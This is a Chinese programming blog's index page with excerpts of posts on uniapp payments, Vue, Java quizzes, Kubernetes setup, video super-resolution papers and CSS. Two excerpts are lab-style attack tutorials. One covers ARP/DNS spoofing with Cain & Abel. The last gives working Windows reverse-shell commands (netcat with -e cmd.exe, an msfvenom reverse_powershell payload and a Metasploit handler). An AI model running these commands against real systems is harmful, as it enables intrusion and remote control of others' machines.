<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.122.0">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程中国的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程中国的博客">
		<meta property="og:title" content="编程中国的博客" />
<meta property="og:description" content="编程中国的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程中国的博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程中国的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程中国的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/33d089081b850fb34793c8b3460708e0/" rel="bookmark">
			uniapp实现苹果支付流程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		uniapp 苹果支付流程 1.配置文件中勾中Apple应用内支付 2.调用 plus.payment.getChannels 来获取支付通道 iphonepay() { const that = this uni.showLoading({ title: '检测支付环境...', mask: true }) plus.payment.getChannels((channels) =&gt; { for (var i in channels) { // 判断是否苹果支付 if (channels[i].id === 'appleiap') { that.iapChannel = channels[i] that.requestOrder() } } }) } 3.调用 上一步拿到对象的requestOrder方法 该方法需要传入三个参数 requestOrder(‘苹果内购商品id’，成功回调，失败回调) 拿到订单数据 拿到订单数据的商品id requestOrder() { const that = this // ['xxxxx'] 是平台申请拿到的内购商品的id that.iapChannel.requestOrder(['xxxxxx'，'xxxxxx'], function(event) { uni.hideLoading() console.log(event) for (var index in event) { var OrderItem = event[index] console.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/33d089081b850fb34793c8b3460708e0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9340758b15a83639b4e5bc4e0b4cc675/" rel="bookmark">
			应用“Cain &amp; Abel”实现DNS欺骗
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		环境的搭建： 1，在Windows 7安装IIS服务，访问www.baidu.com或其他任意站点，保存首页文件至本地wwwroot文件夹中；
（1）打开控制面板，找到“程序”，点进去
点击“打开或关闭Windows功能”
找到“Internet 信息服务”并勾选，然后关机重启
安装完成后，再回到控制面板里面，找到“管理工具”，点进入
双击“Internet 信息服务(IIS)管理器”
点击“基本设置”，根据下图点击确定
这时访问本机地址127.0.0.1
访问www.baidu.com或其他任意站点
保存首页文件至本地wwwroot文件夹中；
并改名为index.html
这时访问127.0.0.1时就为百度页面了
2，在Windows 7使用“Cain &amp; Abel”软件对Windows server 2003实施DNS欺骗攻击； 扫描网段上的所有主机的MAC地址
进入APR页面，左边的框里添加要进行ARP欺骗的主机地址，在右边的框里，选择那台主机的网关
启用APR攻击
DNS攻击，地址设为本地主机地址
在Windows Server 2003使用Arp命令查看网关MAC地址变化情况；（此时欺骗成功） 在Windows Server 2003使用浏览器访问“www.baidu.com”，查看欺骗结果。
这时我们使用windows2003访问百度
再一次验证http://www.baidu.com/iisstart.htm
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b0005882218758541a279c2a88bebb99/" rel="bookmark">
			Vue3 TypeScript 配置 Vuex4
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文记录 Ts 版的 Vue3 项目配置 Vuex。
目录 ./src/store 。
├── store │ ├── index.ts │ └── interface.ts 首先看 ./src/store/index.ts ，这里是整个 store 的入口，里面定义并默认导出了 createStore 方法创建的 store 供整个项目使用。
import { InjectionKey } from 'vue'; import { createStore, Store } from 'vuex'; import RootStateTypes from '@/store/interface'; export default createStore&lt;RootStateTypes&gt;({ state: { test:'test' }, getters :{ }, mutations: { CHANGE_TEST(state,val){ state.test = val; } }, actions: { }, modules: { testModule } }); export const key: InjectionKey&lt;Store&lt;RootStateTypes&gt;&gt; = Symbol('vue-store'); InjectionKey 方法为创建并使用定义 state 时提供唯一的 key，用到了 ES6 的 Symbol。 .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b0005882218758541a279c2a88bebb99/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6f5d73af4c787c17d7e9f572317feab8/" rel="bookmark">
			【每日选择题】11~20天做选择题汇总
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		day 11 4 月23 日测验 1.下面哪个标识符是合法的？(D)
A "9HelloWorld"
B "_Hello World"
C "Hello*World"
D "Hello$World"
标识符只能是数字字母下划线组成的，而且不能以数字开头
2.以下java程序代码，执行后的结果是（C）
java.util.HashMap map=new java.util.HashMap(); map.put("name",null); map.put("name","Jack"); System.out.println(map.size()); A 0
B null
C 1
D 2
Map中键只能出现一次，是惟一的，当出现相同的key时，会覆盖之前的key
3.Java中的集合类包括ArrayList、LinkedList、HashMap等类，下列关于集合类描述错误的是(C)
A ArrayList和LinkedList均实现了List接口
B ArrayList的访问速度比LinkedList快
C 添加和删除元素时，ArrayList的表现更佳
D HashMap实现Map接口，它允许任何类型的键和值对象，并允许将null用作键或值
4.以下描述正确的是(B)
A CallableStatement是PreparedStatement的父接口
B PreparedStatement是CallableStatement的父接口
C CallableStatement是Statement的父接口
D PreparedStatement是Statement的父接口
PreparedStatement 是CallableStatement 的父接口, Statement 是PreparedStatement 的父接口
5.下列程序的运行结果（B）
public static void main(String args[]) { Thread t = new Thread() { public void run() { pong(); } }; t.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6f5d73af4c787c17d7e9f572317feab8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7a1414e1292f6182295284ee4b8bf489/" rel="bookmark">
			Java网络编程入门
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		网络编程是对信息的发送和接收处理。
目录 一、基础点二、TCP三、UDP 一、基础点 * * 网络编程概述 * Java中提供网络类库，可以实现网络连接，底层由JVM控制，且Java实现跨平台的网络库 * 程序员所面对的是一个统一的网络编程环境 * 计算机网络：把分布在不同地理区域的计算机和专门的外部设备用通信线路互连成一个规模大、 * 功能强的网络系统，从而使得众多的计算机和外部设备能互相传递信息、共享硬件、软件和数据资源等 * 网络编程目的：直接或间接的通过网络协议与其他计算机实现数据交换，进行通信 * 主要两个问题：1 如何准确的定位网络的一台和多台主机，且定位主机上特定的应用 * 2 找到主机后如何可靠高效的进行数据传输 * 网络通信 * 通信双方地址：1 IP 2 端口号 * 一定的规则（网络通信协议） * 3 OSI参考模型 * 4 TCP/IP参考模型（TCP/IP协议）：国际标准 * 通信要素1 ：IP地址 * -- 唯一的标识Internet上的计算机（通信实体） * -- 本地回环地址（hostAddress）:127.0.0.1 主机名（hostName）：localhost * -- 分类方式1：IPV4和IPV6 * IPV4：4个字节组成，4个0-255.大概42亿个地址，30亿都在北美？亚洲4亿。2011年初已经用完。 * 以点分十进制表示，如192.168.0.1 * IPV6: 128位（16个字节）。写成8个无符号整数，每个整数用四个十六进制表示，数之间用 ：隔开 * 如 3ffe:3201:1401:1280:c8ff:fe4d:db39:1984 * -- 分类方式2: 公网地址（万维网使用）和私有地址（局域网） * 192.168.开头的是私有地址，范围192.168.0.0 - 192.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7a1414e1292f6182295284ee4b8bf489/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/281fa9fb9f549faa51610c7692146089/" rel="bookmark">
			kubernetes-2-搭建k8s集群
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		二、搭建k8s集群 2.1 平台规划 1.单master集群 2.多master集群(高可用集群) 2.2 服务器硬件要求 2.3 部署方式 2.3.1. Kubeadm工具安装 官方的部署k8s工具, 用于快速部署
第一、创建一个 Master 节点 kubeadm init
第二、将 Node 节点加入到当前集群中 $ kubeadm join &lt;Master 节点的 IP 和端口 &gt;
1. 前置条件 一台或多台机器，操作系统 CentOS7.x-86_x64
硬件配置:2GB 或更多 RAM，2 个 CPU 或更多 CPU，硬盘 30GB 或更多 - 集群中所有机器之间网络互通
可以访问外网，需要拉取镜像
禁止 swap 分区
步骤
vim /etc/fstab
注释swap那一行
echo vm.swappiness=0 &gt;&gt; /etc/sysctl.conf
重启: sudo reboot
验证 free -m
kubeadm是官方社区推出的一个用于快速部署kubernetes集群的工具。
这个工具能通过两条指令完成一个kubernetes集群的部署：
# 创建一个 Master 节点 $ kubeadm init # 将一个 Node 节点加入到当前集群中 $ kubeadm join &lt;Master节点的IP和端口 &gt; 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/281fa9fb9f549faa51610c7692146089/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0cc8ca95aceae65e468e4ffb95c027cb/" rel="bookmark">
			Video SR-2
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、Deep Video Super-Resolution Network Using Dynamic Upsampling Filters Without Explicit Motion Compensation （CVPR018 - DUF） 滑动窗口+DUF+拼接融合 1、出发点 现有方法严重依赖于运动估计和补偿的准确性。 2、主要工作 -本文不同于其他方法显式地计算和补偿输入帧之间的运动，而是把运动信息隐式地用于生成动态上采样滤波器。
本文提出了一种新型的端到端深度网络，它可以生成动态上采样滤波器和残差图像，残差图像依赖于每个像素的局部时空邻域来计算，以避免显式的运动补偿。 3、网络结构 多帧输入，含两个分支：
过滤器生成网络，生成上采样的过滤器，并利用学习到的过滤器对输入LR进行上采样；残差生成网络，用于生成细节纹理信息。
4、 动态上采样滤波器-Dynamic Upsampling Filters 当放大倍数为4时，LR中的一个像素，在HR中要变为16个像素，这16个像素主要通过LR中像素的邻域信息（5x5范围）获得。为了生成16个像素，就需要学习16个5x5的过滤器。
5、总结 这篇文章更像是针对SISR做的一个方法，因为它对多帧信息的利用非常简单，没有对齐，直接拼接，动态上采样滤波器（DUF）也没有看出来它具有隐式的利用运动信息。
二、Frame and Feature-Context Video Super-Resolution （AAAI2019） RNN（上下文网络）+滑动窗口（局部网络）+拼接融合没有光流估计 1、出发点 单独生成每个输出帧可以获得高质量的HR估计，但会导致伪影。在短信息流的情况下，结合之前生成的HR帧可以产生时间一致的结果，但它会导致显著的抖动和锯齿状伪影，因为之前的超分辨率错误不断累积到后续帧。 2、主要工作 本文提出了一种Frame and Feature-Context 的视频超分（FFCVSR）方法。主要包含两个子网络：局部网络和上下文网络。局部网络利用连续LR帧序列生成局部特征和局部SR帧。上下文网络将局部网络输出与之前估计的HR帧和特征相结合，实现对后续帧的超分辨重建。 3、网络结构 4、Local Network 5、Context Network 三、Fast Spatio-Temporal Residual Network for Video Super-Resolution （CVPR2019） 滑动窗口+LR拼接+3D卷积没有光流估计 1、主要工作 3D卷积可以很好地利用多帧视频数据的时间和空间信息，但是，直接使用3D卷积可能会导致过高的计算复杂度，限制了视频SR模型的深度，从而影响性能。本文中提出了一种新的快速时空残差网络(FSTRN)，其中的快速时空残差块(FRB)，它将每个三维滤波器划分为两个具有相当低维的三维滤波器的乘积，在保持低计算负荷的同时提高性能。 2、网络结构 输入LR含有5帧信息，每次只重建中间帧。第一个卷积层为三维卷积，后续堆叠多个FRB。
3、Fast spatio-temporal residual blocks（FRBs） 如图所示，FRB将3DC分为两步进行，将k个kxk卷积转换为一个kxk卷积核k个1x1卷积，计算量更小，计算量和参数量减少了一半。这样，可也利用FRB设计更深的网络，从而获得更好地性能。
四、Recurrent Back-Projection Network for Video Super-Resolution （CVPR2019 RBPN） 滑动窗口+光流估计 1、网络结构 F为光流估计的结果，M为从参考帧和目标帧的特征，L为经过投影模块提取到的低分辨率特征图，H为投影模块提取到的高分辨率特征图。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0cc8ca95aceae65e468e4ffb95c027cb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8d1d06acd94fbdae7bbbd13107eb0573/" rel="bookmark">
			html怎么添加圆圈按钮,如何使用HTML5和CSS 3在圆圈周围放置按钮？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		您可以使用一小部分
jquery来加载您想要的文本的中心圆.
$(document).ready(function() {
$('.quart').click(function() {
var ind = $(this).index();
switch (ind) {
case 0:
var tex = "div 1";
break;
case 1:
var tex = "div 2";
break;
case 2:
var tex = "div 3";
break;
case 3:
var tex = "div 4";
break;
}
$('.center').text(tex);
});
});
.wrap {
height: 300px;
width: 300px;
border-radius: 50%;
position: relative;
overflow: hidden;
}
.quart {
position: absolute;
height: 50%;
width: 50%;
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8d1d06acd94fbdae7bbbd13107eb0573/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b54671720e14a640215c9396d171eec5/" rel="bookmark">
			html中隐藏一个div,css – 如何在另一个div的顶部隐藏半个div？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		你的代码几乎就在那里.您需要做的是设置要隐藏的父级的overflow属性.默认情况下,您的浏览器会将其设置为可见,这样就可以显示突出显示元素两侧的任何内容,如您所见.
这里有一些显示溢出的代码：隐藏在工作中. View it on JSFiddle.
HTML
​
CSS
​​#parent {
width: 100px;
height: 100px;
position: relative;
top: 50px;
left: 50px;
background: #eee;
overflow-y: hidden;
}
#parent &gt; div {
position: absolute;
width: 50px;
height: 50px;
top: -25px;
left: 25px;
background: #555;
}
值得注意的是,在这个例子中,我只是隐藏了垂直方向的溢出.您既可以设置它,也可以只是水平设置或垂直设置.这是非常整洁的东西.
有兴趣了解更多关于溢出的信息？我的男人Chris Coyier有an excellent article about it.你应该在某个时候给它一个通读.
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ef0e0916aa8eac2b5bfa454895c64aa8/" rel="bookmark">
			树和二叉树：二叉树基本运算及其实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		树和二叉树基本运算及其实现 二叉树的基本运算概述 归纳起来，二叉树有以下基本运算：
创建二叉树CreateBTNode(*b, *str)：根据二叉树括号表示法字符串str生成对应的二叉链存储结构b销毁二叉链存储结构DestroyBT(*b)：销毁二叉链b并释放空间查找节点FindNode(*b,x)：在二叉树b中寻找data域值为x的节点，并返回指向该节点的指针找孩子节点LchildNode( p) 和RchildNode( p)：分别求二叉树中节点*p的左孩子节点和右孩子节点求高度BTNodeDepth(*b)：求二叉树b的高度。若二叉树为空，则其高度为0；否则，其高度等于左子树与右子树中的最大高度加1输出二叉树DispBTNode(*b)：以括号表示法输出一棵二叉树 二叉树的基本运算算法实现 （1）创建二叉树CreateBTNode(* b,*str) 正确的二叉树括号表示串中只有4类字符：
单个字符： 节点的值(：表示一棵左子树的开始)：表示一棵子树的结束,：表示一棵右子树的开始 算法设计：
先构造根节点N，再构造左子树L，最后构造右子树R构造右子树R时，找不到N了，所有需要保存N而节点是按最近原则匹配的，所以使用一个栈保存N 用ch扫描采用括号表示法表示二叉树的字符串：
若ch=‘(’：则将前面创建的节点作为双亲结点进栈，并置k=1，表示开始处理左孩子节点若ch=‘)’：表示栈顶节点的左，右孩子节点处理完毕，退栈若ch=‘,’：表示开始处理右孩子节点，置k=2其他情况（节点值）：
创建p节点用于存放ch
当k=1时，将p节点作为栈顶节点的左孩子节点
当k=2时，将*p节点作为栈顶节点的右孩子节点 void CreateBTNode(BTNode *&amp;b,char *str) { //由str-二叉链b BTNode *St[MaxSize],*p; int top=-1,k,j=0; char ch; b = NULL; //建立的二叉链初始时为空 ch = str[j]; while(ch!='\0') { //str未扫描完时循环 switch(ch) {	case'(':top++;St[top]=p;k=1; break; //可能有左孩子节点，进栈 case')':top--; break; case',':k=2; break; //后面为右孩子节点 default: //遇到节点值 p=(BTNode *)malloc(sizeof(BTNode)); p-&gt;data=ch; p-&gt;lchild=p-&gt;rchild=NULL; if (b==NULL) //p为二叉树的根节点 b=p; else { //已建立二叉树根节点 switch(k) { case 1:St[top]-&gt;lchild=p; break; case 2:St[top]-&gt;rchild=p; break; } } } j++; ch=str[j]; //继续扫描str } } （2）销毁二叉链DestroyBT(*b) 递归模型如下：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ef0e0916aa8eac2b5bfa454895c64aa8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/07f2e98bacba6d0d82f9bf0bc7667e31/" rel="bookmark">
			Video SR-1
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、Video Super-Resolution With Convolutional Neural Networks （VSRNet-2016） 滑动窗口+LR图像运动补偿+特征拼接 1、主要工作 提出基于CNN的视频超分算法；提出三种结构，用来融合相邻的多帧信息；提出预训练方法，利用图像数据对VSR模型预训练；利用一种自适应运动补偿方案来处理视频中的快速运动物体和运动模糊； 2、三种结构 3、运动补偿（Motion Compensation） 运动补偿（MC）的作用其实就是多个相邻帧的对齐。
基于运动补偿算法（Druleas algorithm），作者提出自适应运动补偿（AMC），用来解决大运动，严重运动模糊的情况。
从公式可以看出，当运动较大时，即e（i,j）较大时，r（i,j）较小，r小，则t帧权重大，反之，参考帧权重增大。所以，当运动大时，目标帧权重大，当运动小时，参考帧权重增大。
自适应运动补偿基于运动补偿算法改进得来，根据不匹配误差e（i，j）的大小，确定当前帧与相邻帧的权重。作者实验中表明AMC在大运动视频中优于MC算法。
二、Real-Time Video Super-Resolution with Spatio-Temporal Networks and Motion Compensation（VESPCN-CVPR2018） 滑动窗口+LR运动估计（由粗到细网络）+特征拼接3D卷积。SR网络与运动估计网络分开训练。 1、主要工作 提出了一种基于亚像素卷积和时空网络的视频SR实时算法（VESPCN），提高了精度和时间一致性。提出了一种基于多尺度空间变换网络的密集帧间运动补偿方法。 2、网络结构 3、Spatial transformer motion compensation 网络结构
分两步预测光流：先粗略预测光流δc，然后精细预测光流δf，最后将两者相加达到总的光流，利用光流和t+1帧进行Warp操作，得到修正后的t+1帧
class MotionCompensator(nn.Module): def __init__(self, args): self.device = 'cuda' if args.cpu: self.device = 'cpu' super(MotionCompensator, self).__init__() print("Creating Motion compensator") def _gconv(in_channels, out_channels, kernel_size=3, groups=1, stride=1, bias=True): return nn.Conv2d(in_channels*groups, out_channels*groups, kernel_size, groups=groups, stride=stride, padding=(kernel_size // 2), bias=bias) # Coarse flow coarse_flow = [_gconv(2, 24, kernel_size=5, groups=args.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/07f2e98bacba6d0d82f9bf0bc7667e31/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/edd4b9b5b07b514b6068aec68768d5a8/" rel="bookmark">
			微信小程序跳转到另一个小程序 wx.navigateToMiniProgram 方法，调试
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		wx.navigateToMiniProgram(Object object)
需要页面权限：小程序不能在插件页面中调用该接口，插件也不能在小程序页面中调用该接口
打开另一个小程序
wx.navigateToMiniProgram({ appId: 'wxewerwesdas', // APPID path: 'pages/cert/bind' // path 路径 }) wx.navigateToMiniProgram({ appId: '', path: 'page/index/index?id=123', extraData: { foo: 'bar' }, envVersion: 'develop', success(res) { // 打开成功 } }) 跳转调试
参考官方文档：https://developers.weixin.qq.com/miniprogram/dev/api/open-api/miniprogram-navigate/wx.navigateToMiniProgram.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/feb5113dd837d9afc7aedb80209ae5de/" rel="bookmark">
			vue-admin-template实现登录过程（对接Controller）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		vue-admin-template实现登录过程（对接Controller） 关注公众号，每天更新优质好文！
1.引言
vue-admin-template是使用vue+element-ui开发的一款很棒的后台管理系统基础模板。我们一般在上面进行二次开发。
我们可以预览一下，还是很棒的，我很喜欢。
项目预览地址：
https://panjiachen.gitee.io/vue-admin-template 接下来，我们就下载使用一下吧。
第一步、
下载vue-admin-template模板，然后导入到开发工具中，我用的VScode。
下载地址1：github下载地址，下载很慢
下载地址2：百度网盘下载地址
提取码：ssty
（注意：如果你是下载的百度网盘里面的模板，就不用安装依赖了，因为我已经安装好了。就是node_modules文件夹）
下载之后导入到VScode中。）
导入之后路径结构应是这样的：
然后启动项目：
右键项目名，在终端中打开
输入命令npm run dev，回车，启动项目。
npm run dev 首次加载有点慢，请耐心等待，完成之后会自动打开浏览器，而且端口号默认是9528
完成之后如下图：
点击登录，这个精简版的后台界面就好了，我们可以根据自己需要来改页面。
有的小伙伴这里就有问题了对吧，啊！我登录不上啊，报错Network Error ! 怎么会事呢？
别急，我们接下来解决。
我们先分析原因：
打开登录页面，并打开F12调试窗口，点到network
点击Sign in ,看看登录请求路径：
说明这个https://easy-mock.com/mock/接口出问题了呗，不能用了！但没事，我们自己写一个登录接口即可。
后台LoginController:
package com.example.stutea.controller; import com.example.stutea.utils.R; import org.springframework.web.bind.annotation.*; @RestController @RequestMapping("/user") @CrossOrigin public class LoginController { //login @PostMapping("login") public R login(){ return R.ok().data("token","admin"); } //info @GetMapping("info") public R getInfo(){ return R.ok().data("roles","[admin]").data("name","admin").data("avatar","https://img03.sogoucdn.com/app/a/100520093/d71a6360ba8601ff-19264876bfd6a308-dfbd047d3bb4f2621f01d7ae18979b6e.jpg"); } } 工具类：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/feb5113dd837d9afc7aedb80209ae5de/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e311dfd35a928b4bfbd63e6068e0af0b/" rel="bookmark">
			MySQL 报错：Parameter ‘@XXX‘ must be defined.
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		报错信息： Parameter ‘@Name’ must be defined.
解决方案： 连接语句中添加：allowuservariables=True; 即可
配置解析： AllowUserVariables：是否允许 SQL 中出现用户变量，默认 false
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1b336e0831853a6623dffdfd9db8d660/" rel="bookmark">
			com.android.yf.idp,QQ轻聊版-com.tencent.qqlite_v3.3.0_apkpure.apk
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文件列表
文件名
校验码
META-INF/MANIFEST.MF
0xe5f11f5b
META-INF/ANDROIDR.SF
0x17ea8d37
META-INF/ANDROIDR.RSA
0x1d5a0d0e
R/a/hd.xml
0xf3e30913
R/a/he.xml
0xa44d84b8
R/a/hf.xml
0x6ddda183
R/a/hg.xml
0xa31a7c61
R/a/hh.xml
0x1e0f5e5b
R/a/hi.xml
0x3e0618c1
R/a/hj.xml
0xb05d4e0f
R/a/hk.xml
0x5e43aa18
R/a/hn.xml
0x5d5e766a
R/a/ho.xml
0xf7129855
R/a/hu.xml
0x343c2f52
R/a/hv.xml
0x2cb16dfe
R/a/hw.xml
0x2aa4736f
R/a/hxx.xml
0x3667cf25
R/a/hxy.xml
0xf3384436
R/a/ik.xml
0x13e16679
R/a/il.xml
0x9cb84667
R/a/im.xml
0xe89aa60d
R/a/iqp.xml
0x5a175df7
R/a/iqq.xml
0xd4f22f6d
R/a/iqr.xml
0xb43aa677
R/a/iqs.xml
0xafc29483
R/a/iqt.xml
0x35fe52b2
R/a/iqu.xml
0x7e4bb295
R/a/iqv.xml
0x6250df19
R/a/iqw.xml
0x9307456
R/a/jl.xml
0xc90e984a
R/a/jr.xml
0x81d9ba6e
R/a/kn.xml
0xc08d79de
R/a/ko.xml
0x9c1ce954
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1b336e0831853a6623dffdfd9db8d660/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5d6825b6db5cd5c5b9ad06e5c0f685c6/" rel="bookmark">
			2021-05-26
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、随机存取就是直接存取，可以通过下标直接访问的那种数据结构，与存储位置无关，例如数组。非随机存取就是顺序存取了，不能通过下标访问了，只能按照存储顺序存取，与存储位置有关，例如链表。　2、顺序存取就是存取第N个数据时，必须先访问前（N-1）个数据 （list），随机存取就是存取第N个数据时，不需要访问前（N-1）个数据，直接就可以对第N个数据操作 （array）。
存储结构：分为顺序存储和随机存储
1.顺序存储结构　在计算机中用一组地址连续的存储单元依次存储线性表的各个数据元素，称作线性表的顺序存储结构。顺序存储结构是存储结构类型中的一种，该结构是把逻辑上相邻的节点存储在物理位置上相邻的存储单元中，结点之间的逻辑关系由存储单元的邻接关系来体现。由此得到的储结构为顺序存储结构，通常顺序存储结构是借助于计算机程序设计语言（例如c/c++）的数组来描述的。　顺序存储结构的主要优点是节省存储空间，因为分配给数据的存储单元全用存放结点的数据（不考虑c/c++语言中数组需指定大小的情况），结点之间的逻辑关系没有占用额外的存储空间。采用这种方法时，可实现对结点的随机存取，即每一个结点对应一个序号，由该序号可以直接计算出来结点的存储地址。但顺序存储方法的主要缺点是不便于修改，对结点的插入、删除运算时，可能要移动一系列的结点。　2、随机存储结构　在计算机中用一组任意的存储单元存储线性表的数据元素（这组存储单元可以是连续的，也可以是不连续的）。　它不要求逻辑上相邻的元素在物理位置上也相邻。因此它没有顺序存储结构所具有的弱点，但也同时失去了顺序表可随机存取的优点。　随机存储最典型的代表为链式存储：　链式存储结构特点　1、比顺序存储结构的存储密度小 （每个节点都由数据域和指针域组成，所以相同空间内假设全存满的话顺序比链式存储更多）。　2、逻辑上相邻的节点物理上不必相邻。　3、插入、删除灵活 （不必移动节点，只要改变节点中的指针）。　4、查找结点时链式存储要比顺序存储慢。　5、每个结点是由数据域和指针域组成。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fd52d22d06e00df72f315f01642c833b/" rel="bookmark">
			vue实现vr看360°全景效果
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1：首先创建一个vue的基础项目
vue create demo
2：启动并打开项目
3：在生成的public文件夹下找到Index.html，然后在script标签中引入three.js
&lt;script src="https://cdn.jsdelivr.net/npm/three@0.93.0/build/three.min.js"&gt;&lt;/script&gt; 4：在template模块中创建一个div，并绑定一个id
&lt;div ref="container" id="container" style="width: 100%; height: 100%"&gt;&lt;/div&gt; 其次，需要给html，body，默认的容器#app这三类元素设定宽高（必须）
5：在data中定义全局变量
data() { return { sceneUrl: '', // 需要预览的图片绝对路径 camera: null, scene: null, renderer: null, isUserInteracting: false, onPointerDownPointerX: 0, onPointerDownPointerY: 0, lon: 0, onPointerDownLon: 0, lat: 0, onPointerDownLat: 0, phi: 0, theta: 0, target: new THREE.Vector3() } } 6：在methods中写入方法
methods: { init() { let textureLoader = new THREE.TextureLoader(); textureLoader.load(this.sceneUrl, (texture) =&gt; { texture.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fd52d22d06e00df72f315f01642c833b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/941b4b97e131b71a3b84190d4ca5936c/" rel="bookmark">
			Windows下反弹shell的方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、Windows下反弹shell 1.nc反弹
（1）我们先在被控制主机下载netcat。netcat下载
（2）cmd下打开下载目录，输入：
nc 192.168.59.131 9999 -e C:\Users\21124\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System Tools\cmd.exe（本机cmd文件路径） （3）可以看到shell是反弹回来的，但是可能由于防火墙的原因，控制极其不稳定。
2.msf反弹
（1）使用 msfvenom -l 结合关键字过滤（如cmd/windows/reverse），找出我们可能需要的payload。
（2）使用msfvenom生成一个powershell类型的木马。
（3）开启监听端口。
（4）目标机在cmd下执行生成的powershell脚本，powershell下执行好像反弹不了。可以看到，这里是反弹成功的。
msfvenom -l payloads | grep 'cmd/windows/reverse' msfvenom -p cmd/windows/reverse_powershell LHOST=192.168.40.146 LPORT=4444 use exploit/multi/handler show options set LHOST your-ip show options(查看是否配置齐全) run 3.利用CS主机上线。
二、交互式shell与非交互式shell 交互式模式就是在终端上执行，shell等待你的输入，并且立即执行你提交的命令。这种模式被称作交互式是因为shell与用户进行交互。这种模式也是大多数用户非常熟悉的：登录、执行一些命令、退出。当你退出后，shell也终止了。
